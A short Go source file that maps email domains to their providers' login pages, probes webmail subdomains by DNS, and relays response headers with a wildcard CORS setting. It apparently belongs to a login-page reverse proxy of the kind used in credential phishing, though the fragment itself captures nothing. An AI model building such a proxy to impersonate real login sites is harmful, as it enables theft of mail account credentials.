package main

import (
	"net"
	"net/http"
	"strings"
)

var ProviderMapping = map[string]string{
	"gmail.com":   "https://accounts.google.com/",
	"outlook.com": "https://login.live.com/",
	"hotmail.com": "https://login.live.com/",
	"yahoo.com":   "https://login.yahoo.com/",
	"icloud.com":  "https://appleid.apple.com/",
	"qq.com":      "https://mail.qq.com/",
	"163.com":     "https://mail.163.com/",
	"126.com":     "https://mail.126.com/",
}

func GetTargetDomain(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) < 2 {
		return "https://accounts.google.com/"
	}
	domain := strings.ToLower(parts[1])

	if target, ok := ProviderMapping[domain]; ok {
		return target
	}

	subdomains := []string{"webmail", "mail", "exchange"}
	for _, sub := range subdomains {
		fullDomain := sub + "." + domain
		_, err := net.LookupHost(fullDomain)
		if err == nil {
			return "https://" + fullDomain + "/"
		}
	}
	return "https://" + domain + "/"
}

func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
	dst.Header().Set("Content-Type", src.Header.Get("Content-Type"))
	dst.Header().Set("Access-Control-Allow-Origin", "*")
}
